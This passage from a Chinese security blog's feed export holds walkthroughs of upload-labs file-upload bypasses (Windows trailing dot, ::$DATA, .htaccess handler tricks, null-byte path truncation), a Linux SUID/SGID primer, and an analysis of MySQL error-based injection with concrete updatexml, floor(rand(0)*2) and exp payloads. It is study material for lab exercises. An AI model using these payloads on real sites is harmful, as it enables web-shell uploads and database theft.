UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 审计：大小写转化、去空格、禁止上传htacess，但是没有删除文件后面的点。于是利用windows的特性，虽然加上了点但是依旧会忽略掉。上传绕过：访问得到： 第八关 源码： 123456789101112131415161718192021222324$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 审计：去空、限制htaccess、去点、大小写限制。但是没有限制data。上传绕过：在php+windows的情况下：如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名。 在第八节的时候我曾经想过一个法子，就是他只过滤了一次空格和逗号，所以我就构造了1.php. 空格 .。文件上传成功。但是由于一下两句话：$img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;$file_ext = strrchr($file_name, &#39;.&#39;);他是截取了逗号之后的东西，但是逗号之后是空格，也就是说我们最终得到的文件是随机数字，就没了就没了！！但是我们在后台找到了我文件输入了文件名字，执行之后没有执行php代码只是显示出了文件的源码。 第九关源码： 123456789101112131415161718192021222324$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125; 审计：move_upload_file的文件名直接为用户上传的文件名，我们可控。且会删除文件名末尾的点，因此我们可以结合Pass-7用.php.空格.绕过。windows会忽略文件末尾的.和空格。我们在第八个曾经也尝试过第九个的绕过方式，第八个不行但是为什么第九个不行?$img_path = UPLOAD_PATH.&#39;/&#39;.$file_name; 这里拼接的是原本的文件名字$img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; 这里拼接的是经过”加工”的文件名。恍然大悟了吧。上传绕过：]]></content>
      <categories>
        <category>漏洞原理</category>
        <category>文件上传</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[upload-labs-一]]></title>
    <url>%2F2019%2F08%2F06%2Fupload-labs-%E4%B8%80%2F</url>
    <content type="text"><![CDATA[今天我们开始文件上传的学习。 第一关 源代码：1234567891011121314151617function checkFile() &#123; var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == "") &#123; alert("请选择要上传的文件!"); return false; &#125; //定义允许上传的文件类型 var allow_ext = ".jpg|.png|.gif"; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(".")); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + "|") == -1) &#123; var errMsg = "该文件不允许上传，请上传" + allow_ext + "类型的文件,当前文件类型为：" + ext_name; alert(errMsg); return false; &#125;&#125; 审计：刚开始是以php审计的后来发现有些函数不对劲啊，后来才发现是前端代码emmmmmmmmmm。1.getElementsByName()Web标准下可以通过getElementById(), getElementsByName(), and getElementsByTagName()访问Documnent中的任一个标签。2.lastIndexOf()indexOf 和 lastIndexOf 都是索引文件indexOf 是查某个指定的字符串在字符串首次出现的位置（索引值） （也就是从前往后查）lastIndexOf 是从右向左查某个指定的字符串在字符串中最后一次出现的位置（也就是从后往前查）,但是后者虽然从后往前查，计数的时候是从前往后开始计数即第一个数为1。所以使用这两个函数的时候返回值一样。3.if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1)为什么要返回-1呢？indexOf(String str): 返回指定字符在字符串中第一次出现处的索引，如果此字符串中没有这样的字符，则返回 -1。 上传绕过既然是前端检测，首先我们可以修改前端代码或者禁用js代码，然后我们可以burp抓包修改然后发包。1.修改代码,粘贴复制到控制台为啥要复制到控制台？(我一开始是查看源代码直接修改的肯定不好使）控制台是程序员调试使用的。可以调试，查看源文件，跟踪链接，写js代码等。主要是在浏览器端的测试用。查看文件：我在一开始查看上传文件的时候，提示url错误。无非两个原因第一个文件没有上传成功，第二就是路径错了。后来打开本地发现确实是路径错了。 2.burp抓包修改。啰嗦一下原理。抓包修改就是说我们先将文件后缀修改为为它允许上传的后缀(但是内容不变)，然后绕过了前端的检测之后在burp中把后缀改成我们想要的后缀。我们修改jpg为php，我们可以看到我们的文件内容是不被修改的。上传成功。3.禁用前端代码不提倡用这个，也很简单就是浏览器设置一下就ok。 第二关 源码： 1234567891011121314151617$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']; if (move_uploaded_file($temp_file, $img_path))&#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 审计：1.$ _FILES在这里讲一下这个变量，一直以为这是个用户自定义的变量。后来发现这是一个有点东西的数字变量：$ _FILES数组内容如下:$ _FILES[‘myFile’][‘name’] 客户端文件的原名称。$ _FILES[‘myFile’][‘type’] 文件的 MIME 类型，需要浏览器提供该信息的支持，例如”image/gif”。$ _FILES[‘myFile’][‘size’] 已上传文件的大小，单位为字节。$ _FILES[‘myFile’][‘tmp_name’] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，但 用 putenv() 函数设置是不起作用的。 2.file_exists()file_exists() 函数检查文件或目录是否存在。3.move_uploaded_file()move_uploaded_file() 函数将上传的文件移动到新位置。move_uploaded_file(file,newloc)#(文件名字，文件位置)综上，代码的意思就是先判断路径存不存在，然后在检测文件的content-tye，然后给予临时文件名，移动文件到新的目录。 上传绕过：1.burp抓包既然是检测content-type肯定是要使用burp。第一次做没成功emmmmmm菜鸡啊。后来发现burp中有两个content-type两者区别：第一个为http请求中的content-type： MediaType，即是Internet Media Type，互联网媒体类型；也叫做MIME类型，在Http协议消息头中，使用Content-Type来表示具体请求中的媒体类型信息。这里就是指的是我们的请求网页的类别。从图中我们可以看到类型为：multipart/form-data ： 需要在表单中进行文件上传时，就需要使用该格式。(与我们的上传网页很符合对吧)第二个为我们上传的文件类型：即php的对应类型，所以我们应该修改第二个content-type 第三关 源码 123456789101112131415161718192021222324 if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array('.asp','.aspx','.php','.jsp'); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if(!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 审计：1.strrchr()strrchr() 函数查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符。上传绕过：1.黑名单判断，服务器端禁止上传’.asp’,’.aspx’,’.php’,’.jsp’后缀的脚本文件。大写绕过也不行。在这里我们开个小外篇： 文件解析漏洞是指中间件（Apache、nginx、iis等）在解析文件时出现了漏洞，从而，黑客可以利用该漏洞实现非法文件的解析。文件解析漏洞与文件上传漏洞是两个不同的漏洞概念，文件解析漏洞是利用了中间件（Apache、nginx、iis等）配置不当的弱点进行攻击。PHP解析漏洞Apache将从右至左开始判断后缀，若x3非可识别后缀，再判断x2，一直到找到可识别后缀为止，然后将该可识别后缀进解析。Apache的文件解析过程是从右到左开始判断解析,如果为不可识别的后缀解析,就再往左判断。在Apache的解析中，除了“php|php3|phtml”等规定的后缀中，任何的后缀加入，都是不会被识别解析的，也会被跳过后缀处理。举栗子：jaky.php.k1.w2.a3结果则会执行：jaky.php扩展知识：.htaccess文件.htaccess文件是运行Apache Web Server的Web服务器的配置文件，对配置和重定向Apache Web Server文件系统很有用。如果Apache中.htaccess可被执行并可被上传，那么可以尝试在.htaccess中写入：&lt;FilesMatch “jaky.jpg”&gt; SetHandler application/x-httpd-php “jaky.jpg”文件中写的是木马文件，再把jaky.jpg”上传到受害者服务器中。此时“jaky.jpg”是会被当作“jaky.php”，就可以被攻击者所利用。在这里我们其实也可以上传phtml，php3，php4, php5, pht后缀名都可以绕过。但是为什么这些文件也能被解析？与php.ssp等等不同。在Apache的模块的配置文件中找到了php5.conf，配置文件中会有 123.+.ph(p[345]?|t|tml) .+\.phps$ 此类的正则表达式，文件名满足即可被当做php解析，也就是说php3，php4，php5，pht，phtml,phps都是可以被解析的。我们在C:\phpStudy\PHPTutorial\Apache\conf文件中打开查看：我们可以看到他定义了php和phtml，也可以加上正则表达式。 123456AddType application/x-httpd-php .php 加入“AddType application/x-httpd-php .php”、 &quot;AddType application/x-httpd-php .html&quot;两行， 你也可以加入更多，实质就是添加可以执行php的文件类型，比如你再加上一行 &quot;AddType application/x-httpd-php .htm&quot;，则.htm文件也可以执行php程序了，你甚至还可以添加上一行 &quot;AddType application/x-httpd-php .txt&quot;，让普通的文本文件格式也能运行php程序 在Ubuntu上是利用 正则表达式的： 12345678910111213&lt;FilesMatch &quot;.+\.ph(p[345]?|t|tml)$&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;&lt;FilesMatch &quot;.+\.phps$&quot;&gt;SetHandler application/x-httpd-php-sourceOrder Deny,AllowDeny from all&lt;/FilesMatch&gt;# Deny access to files without filename (e.g. &apos;.php&apos;)&lt;FilesMatch &quot;^\.ph(p[345]?|t|tml|ps)$&quot;&gt;Order Deny,AllowDeny from all&lt;/FilesMatch&gt; 如果apache开启了mod_rewrite模块，可以编辑.htaccess添加下面那段语句AddType application/x-httpd-php .html .htm 所以我们直接上传对应文件。但是我们在执行的时候发现返回url不存在，肯定是我们的文件名错了或者路径错了。打开本地查看文件名称：对应：$img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;我们可以看到他被文件名字随机化了。]]></content>
      <categories>
        <category>漏洞原理</category>
        <category>文件上传</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[linux权限体系（三）特殊权限SUID、SGID]]></title>
    <url>%2F2019%2F08%2F04%2Flinux%E6%9D%83%E9%99%90%E4%BD%93%E7%B3%BB%EF%BC%88%E4%B8%89%EF%BC%89%E7%89%B9%E6%AE%8A%E6%9D%83%E9%99%90SUID%E3%80%81SGID%2F</url>
    <content type="text"><![CDATA[一、SUID1.1 基础知识SUID 是针对二进制可执行文件而言的，他的最终目的是所有用户在执行设置了SUID的二进制可执行文件时，该二进制拥有的权限是文件所有者的权限。（打破安全上下文法则）。 案例理解: 1234[root@tysonscloud ~]# ls -l /bin/passwd -rwsr-xr-x. 1 root root 27832 Jun 10 2014 /bin/passwd[root@tysonscloud ~]# ls -l /etc/shadow---------- 1 root root 948 Jan 29 15:25 /etc/shadow 用户用passwd命令修改密码是对/etc/shadow这个文件进行操作，然而普通用户对这个文件是没有任何权限的。按照从前的理论是没有办法对密码进行修改的。而SUID的作用就是使得普通用户在执行passwd这个程序后，产生的passwd进程的权限与该进程的所有者（root）而不是发起者（普通用户） 相同，这样普通用户就可以通过/etc/passwd这个程序进行密码修改了。 1.2 安全上下文法则 程序启动前：用户是否能够启动某二进制可执行文件为进程，取决于用户是否对该二进制可执行文件拥有x权限。程序启动：进程拥有的权限为发起者的权限，也就是进程的属主是发起者的属主。1.3 启用SUID后进程的属主程序启动前：用户是否能够启动某二进制可执行文件为进程，取决于用户是否对该二进制可执行文件拥有x权限。程序启动后：进程拥有的权限为二进制可执行文件属主的权限，也就是进程的属主是二进制文件的属主。简言之，当我们启动某个二进制程序，该程序调用了其他非对象，此对象非启动者所有，也不具备相应权限时，此时无法成功执行。但是当我们为这个二进制程序赋予了SUID，则被调用的这个对象会被临时赋予该对象的所有者权限 下面直接演用鸟哥的示例来描述这个问题 ls -hltr /usr/bin/passwd /etc/shadow-rwsr-xr-x. 1 root root 31K Feb 22 2012 /usr/bin/passwd ###权限为rws———-. 1 root root 950 Aug 25 2016 /etc/shadow 密码文件/etc/shadow只有root用户拥有修改权限，那其他用户是如何修改自身密码的呢，那就是由于命令passwd拥有SUID权限 a、vbird 对於 /usr/bin/passwd 这个程序来说是具有 x 权限的，表示 vbird 能运行 passwd； b、passwd 的拥有者是 root 这个帐号； c、vbird 运行 passwd 的过程中，会『暂时』获得 root 的权限； d、/etc/shadow 就可以被 vbird 所运行的 passwd 所修改。但如果 vbird 使用 cat 去读取 /etc/shadow 时，他能够读取吗？因为 cat 不具有 SUID 的权限，所以 vbird 运行 『cat /etc/shadow』 时，是不能读取 /etc/shadow 的。 1.4 案例2在root用户环境下将二进制可执行文件/bin/cat复制到tyson用户的家目录对应文件夹下，可以看到此时是没有设置SUID的。（注意：SUID只会在属主的权限中显示）。 1234[root@Tyson Lee learnSuid]# cp /bin/cat /home/tyson/learnSuid/[root@Tyson Lee learnSuid]# lltotal 56-rwxr-xr-x. 1 root root 54080 Jan 14 01:29 cat 切换成tyson用户，测试在没有设置SUID权限的情况：拥有cat文件执行权限的tyson用户启动cat进程后，进程拥有的权限是tyson用户的权限。也就是说仅仅拥有tyson用户权限的cat程序无法对/etc/shadow文件进行操作（该文件的other权限为—）。 123456789101112[root@Tyson Lee learnSuid]# su - tysonLast login: Mon Jan 14 01:27:53 CST 2019 on pts/0[tyson@Tyson Lee ~]$ cd learnSuid/[tyson@Tyson Lee learnSuid]$ ls -altotal 60drwxr-xr-x. 2 root root 17 Jan 14 01:29 .drwx------. 10 tyson tyson 4096 Jan 14 01:29 ..-rwxr-xr-x. 1 root root 54080 Jan 14 01:29 cat[tyson@Tyson Lee learnSuid]$ ~/learnSuid/cat /etc/shadow/home/tyson/learnSuid/cat: /etc/shadow: Permission denied[tyson@Tyson Lee ~]$ ls -l /etc/shadow----------. 1 root root 881 Jan 10 12:17 /etc/shadow 二、SGID2.1 基础知识SGID的产生需求：root用户需要设置某一个文件夹，使得其他普通用户在该文件夹下创建文件的时候，所创建的文件的属组是目录的属组（而默认情况下文件的属组是创建者的属组）。SGID可以作用在文件和目录上：作用在文件上：类似于SUID，用户将二进制可执行文件启用成进程后，进程的属组是二进制可执行文件的属组，进程的权限是二进制可执行文件属组的权限。作用在目录上：任何用户在该目录下创建的文件的属组与目录的属组相同。]]></content>
      <categories>
        <category>Linux基础</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[关于上传中的00截断分析]]></title>
    <url>%2F2019%2F08%2F03%2F%E5%85%B3%E4%BA%8E%E4%B8%8A%E4%BC%A0%E4%B8%AD%E7%9A%8400%E6%88%AA%E6%96%AD%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[关于上传中00截断的细节，很多朋友在渗透中都会发现一些这样的有趣现象，这个站点使用00截断上传的方法上传成功了，而换一个站点又失败了，这是什么原因呢？你看了这篇文章就会明白。 00截断原理 0x00是字符串的结束标识符，攻击者可以利用手动添加字符串标识符的方式来将后面的内容进行截断，而后面的内容又可以帮助我们绕过检测。 00截断的限制条件 1PHP&lt;5.3.29，且GPC关闭 00截断的利用方法 上传文件后缀检测代码123456789101112$uploaded_name = $_FILES[ &apos;file&apos; ][ &apos;name&apos; ];$uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, &apos;.&apos; ) + 1); // 提取上传文件后缀$target_name = md5( uniqid() . $uploaded_name ) . &apos;.&apos; . $uploaded_ext; // 对上传文件进行重命名if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ))&#123; move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $dir . $target_name); // 将临时文件移动到指定目录 $result = $dir . $target_name; echo &quot;Stored in: $result&quot;; &#125;else&#123; echo &quot;Invalid file&quot;;&#125; 误区:有很多朋友喜欢在文件名中加%00进行截断，笔者认为这种方式是不对的，为什么呢？比如攻击者构造文件名：admintony.php%00a.jpg，在提取后缀名的时候遇到%00则认为字符串结束了，那么他提取到的后缀名会是.php，.php后缀又不允许上传所以上传失败了(这里有必要提一句，有人可能会说在一些情况下，%00截断文件名可以成功，这种案例你试一下是不是任意文件上传，西普的00截断实验就是一个任意文件上传的上传点，既然是任意文件上传又何必用00截断绕过呢？)正确用法:那么00截断应该在什么时候使用呢？笔者认为，数据包中必须含有上传后文件的目录情况才可以用，比如数据包中存在path: uploads/，那么攻击者可以通过修改path的值来构造paylod: uploads/aa.php%00为什么修改path才可以，因为程序中检测的是文件的后缀名，如果后缀合法则拼接路径和文件名，那么攻击者修改了path以后的拼接结果为：uploads/aaa.php%00/2018051413370000.php，移动文件的时候会将文件保存为uploads/aaa.php，从而达到Getshell效果。 %00和%00(urldecode) 在网上常见用Burp将数据包中的%00进行urldecode的操作，那为什么要进行这一个操作？网上也常见直接放入%00就可以截断成功的案例，为什么呢？%00(urldecode) 首先解释为什么要进行urldecode操作呢？其原因在于上传的表单中有一个enctype的属性，并且需要enctype=&quot;multipart/form-data&quot;(不对表单中数据进行编码)，path大多数都是存放在表单中的，因此需要在数据包中进行urldecode操作使%00变成字符串结束符号。%00那么为什么网上也有直接添加%00而不进行urldecode操作呢？因为path也可以存放在URL或者Cookie中，而在提交数据的时候，浏览器会对数据做一次urldecode的操作，而到服务端，会对数据进行一次urldecode的操作，因此如果path在非enctype=multipart/form-data的表单中或URL or Cookie中的时候，就可以直接写%00不需要进行URLdecode操作，让服务端对%00进行URL解码即可。]]></content>
      <categories>
        <category>漏洞原理</category>
        <category>上传漏洞</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Mysql报错注入原理分析(count()、rand()、group by)]]></title>
    <url>%2F2019%2F08%2F03%2FMysql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90-count-%E3%80%81rand-%E3%80%81group-by%2F</url>
    <content type="text"><![CDATA[0x00 疑问 一直在用mysql数据库报错注入方法，但为何会报错？ 百度谷歌知乎了一番，发现大家都是把官网的结论发一下截图，然后执行sql语句证明一下结论，但是没有人去深入研究为什么rand不能和order by一起使用，也没彻底说明三者同时使用报错的原理。 0x01 位置问题？select count(*),(floor(rand(0)2))x from information_schema.tables group by x; 这是网上最常见的语句,目前位置看到的网上sql注入教程,floor 都是直接放count() 后面，为了排除干扰，我们直接对比了两个报错语句，如下图由上面的图片，可以知道报错跟位置无关。 0x02 绝对报错还是相对报错？是不是报错语句有了floor(rand(0)*2)以及其他几个条件就一定报错？其实并不是如此，我们先建建个表，新增一条记录看看，如下图：确认表中只有一条记录后，再执行报错语句看看，如下图：多次执行均未发现报错。 然后我们新增一条记录。然后再测试下报错语句多次执行并没有报错 OK 那我们再增加一条 执行报错语句ok 成功报错 由此可证明floor(rand(0)*2)报错是有条件的，记录必须3条以上，而且在3条以上必定报错，到底为何？请继续往下看。 0x03 随机因子具有决定权么(rand()和rand(0))为了更彻底的说明报错原因，直接把随机因子去掉，再来一遍看看，先看一条记录的时候，如下图:一条记录的话 无论执行多少次也不报错然后增加一条记录。两条记录的话 结果就变成不确定性了随机出现报错。然后再插入一条，三条记录之后，也和2条记录一样进行随机报错。由此可见报错和随机因子是有关联的，但有什么关联呢，为什么直接使用rand()，有两条记录的情况下就会报错，而且是有时候报错，有时候不报错，而rand(0)的时候在两条的时候不报错，在三条以上就绝对报错？我们继续往下看。 0x04不确定性与确定性前面说过，floor(rand(0)2)报错的原理是恰恰是由于它的确定性，这到底是为什么呢？从0x03我们大致可以猜想到，因为floor(rand()2)不加随机因子的时候是随机出错的，而在3条记录以上用floor(rand(0)2)就一定报错，由此可猜想floor(rand()2)是比较随机的，不具备确定性因素，而floor(rand(0)2)具备某方面的确定性。为了证明我们猜想，分别对floor(rand()2)和floor(rand(0)2)在多记录表中执行多次(记录选择10条以上)，在有12条记录表中执行结果如下图：连续3次查询，毫无规则，接下来看看select floor(rand(0)2) from T-Safe;，如下图：可以看到floor(rand(0)*2)是有规律的，而且是固定的，这个就是上面提到的由于是确定性才导致的报错，那为何会报错呢，我们接着往下看。 0x05 count与group by的虚拟表使用select count() from T-Safe group by x;这种语句的时候我们经常可以看到下面类似的结果：可以看出 test12的记录有5条与count()的结果相符合，那么mysql在遇到select count() from TSafe group by x;这语句的时候到底做了哪些操作呢，我们果断猜测mysql遇到该语句时会建立一个虚拟表(实际上就是会建立虚拟表)，那整个工作流程就会如下图所示：1.先建立虚拟表，如下图(其中key是主键，不可重复):2.开始查询数据，取数据库数据，然后查看虚拟表存在不，不存在则插入新记录，存在则count()字段直接加1，如下图:3.由此看到 如果key存在的话就+1， 不存在的话就新建一个key。那这个和报错有啥内在联系，我们直接往下来，其实到这里，结合前面的内容大家也能猜个一二了。 0x06 floor(rand(0)*2)报错其实mysql官方有给过提示，就是查询的时候如果使用rand()的话，该值会被计算多次，那这个”被计算多次”到底是什么意思，就是在使用group by的时候，floor(rand(0)2)会被执行一次，如果虚表不存在记录，插入虚表的时候会再被执行一次，我们来看下floor(rand(0)2)报错的过程就知道了，从0x04可以看到在一次多记录的查询过程中floor(rand(0)2)的值是定性的，为011011…(记住这个顺序很重要)，报错实际上就是floor(rand(0)2)被计算多次导致的，具体看看select count() from TSafe group by floor(rand(0)2);的查询过程：1.查询前默认会建立空虚拟表如下图:2.取第一条记录，执行floor(rand(0)2)，发现结果为0(第一次计算),查询虚拟表，发现0的键值不存在，则floor(rand(0)2)会被再计算一次，结果为1(第二次计算)，插入虚表，这时第一条记录查询完毕，如下图:3.查询第二条记录，再次计算floor(rand(0)2)，发现结果为1(第三次计算)，查询虚表，发现1的键值存在，所以floor(rand(0)2)不会被计算第二次，直接count()加1，第二条记录查询完毕，结果如下:4.查询第三条记录，再次计算floor(rand(0)2)，发现结果为0(第4次计算)，查询虚表，发现键值没有0，则数据库尝试插入一条新的数据，在插入数据时floor(rand(0)2)被再次计算，作为虚表的主键，其值为1(第5次计算)，然而1这个主键已经存在于虚拟表中，而新计算的值也为1(主键键值必须唯一)，所以插入的时候就直接报错了。5.整个查询过程floor(rand(0)2)被计算了5次，查询原数据表3次，所以这就是为什么数据表中需要3条数据，使用该语句才会报错的原因。 0x07 floor(rand()*2)报错由0x05我们可以同样推理出不加入随机因子的情况，由于没加入随机因子，所以floor(rand()2)是不可测的，因此在两条数据的时候，只要出现下面情况，即可报错，如下图:最重要的是前面几条记录查询后不能让虚表存在0,1键值，如果存在了，那无论多少条记录，也都没办法报错，因为floor(rand()2)不会再被计算做为虚表的键值，这也就是为什么不加随机因子有时候会报错，有时候不会报错的原因。如图：当前面记录让虚表长成这样子后，由于不管查询多少条记录，floor(rand()2)的值在虚表中都能找到，所以不会被再次计算，只是简单的增加count()字段的数量，所以不会报错，比如floor(rand(1)*2)，如图： 这里再补充一下知识点UpdateXml() MYSQL显错注入在学习之前,需要先了解 UpdateXml() 。UPDATEXML (XML_document, XPath_string, new_value);第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。第三个参数：new_value，String格式，替换查找到的符合条件的数据作用：改变文档中符合条件的节点的值然后咱们再看看语句：http://www.XXXIII.com/a.php?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)CONCAT(str1,str2,…)返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL。通过查询@@version,返回版本。然后CONCAT将其字符串化。因为UPDATEXML第二个参数需要Xpath格式的字符串,所以不符合要求，然后报错。错误大概会是：ERROR 1105 (HY000): XPATH syntax error: ’:root@localhost’1、floor函数因为之前讲双查询语句时，就把floor函数报错也进行了讲解，这里就不再重复。忘记的翻翻我的其他博客(sql分类)这里贴个sql注入的floor语句公式：and (select 1 from(select count(),concat(version(),floor(rand(0)2))x from information_schema.tables group by x)a)这些sql注入的语句公式，都是研究人员经过测试总结出来的。我们需要的则是，了解这个语句公式的含义和了解其背后的逻辑原理，之后收集一些sql语句注入公式拿来进行fuzz检测即可。简单一句话就是:自己在看懂和明白sql注入的原理基础上，那别人总结出的sql注入语句利用实现就好了。因为很多sql注入语句都是基于这些sql注入原始公式语句变形而来的，背后的逻辑原理不会改变的。好啦，不吹了，我们继续学习剩下的函数。2、exp()函数exp函数相信大家都十分的熟悉，这是一个数学函数，用于计算e的x次方的函数。exp函数特性：在mysql数据库中，exp()只能计算710之内的数值，一旦超过或者等于710的话，则会进行整形报错溢出。提示：DOUBLE value is outof range in ‘exp(710)’ double类型超出了exp(710)范围。这里顺便在提下，如果构造利用为 ~0的话，它是代表着按0按位取反就会返回“18446744073709551615”，得到最大的无符号BIGINT值。所以利用上述exp和特性，我们可以构造成payload:and (EXP((select * from(select version())a)));利用环境：mysql&gt;5.5.5利用它的这个特性，我们可以构造成payload:and (EXP((select * from(select version())a)));通过先是通过子查询产生了最大的无符号BIGINT值，之后通过exp()函数形成了DOUBLE报错，从而能够得到我们想要的版本报错信息。至于后面怎么操作，不要太死板呀。就version()你看看怎么改，换成什么database(),user()…自己慢慢思考下。在这里有些人可能会有一些问题：就是说为啥exp(数据库版本)，就会报错？其实在这里我们可以不用去关注select查询的东西，select在这个语句他只要成功执行就会返回一个0，所以就相当于exp( ~0)3、数据重复报错利用环境：mysql低版本payload：select * from (select NAMECONST(version(),1),NAMECONST(version(),1))x这里利用了数据库无法识别重复查询数据库版本信息的操作，从而进行报错。4、Xpath报错（我的博客好像也单独讲过）数据库环境:mysql 5.1.5在学习Xpath函数之前，我们先了解下updatexml()函数和extractvalue()函数。updataxml()函数UPDATEXML (XMLdocument, XPathstring, new_value);第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc第二个参数：XPath_string (Xpath格式的字符串)第三个参数：new_value，String格式，替换查找到的符合条件的数据作用：改变文档中符合条件的节点的值（其实简单的说，就是对xml进行查询和修改）简单分析下，在这里我们先是查询了数据库的版本信息，而后concat函数进行连接字符串信息，然后利用xml语法进行查询和修改。但是我们却使用0x7e进行拼接，0x7e是啥？这是特殊字符进行十六进制转换的结果。同时updataxml函数是第二位置是拼接xml字符串，而extractvalue是需要xml路径。至于xml具体语法我就不讲解了，这里0x7e嵌套在里面的话，xml语法是无法识别的，所以会进行报错，从而产生了报错得到我们想要的信息。]]></content>
      <categories>
        <category>漏洞原理</category>
        <category>SQL注入</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[实验吧---加了料的报错注入]]></title>
    <url>%2F2019%2F08%2F03%2F%E5%AE%9E%E9%AA%8C%E5%90%A7-%E5%8A%A0%E4%BA%86%E6%96%99%E7%9A%84%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%2F</url>
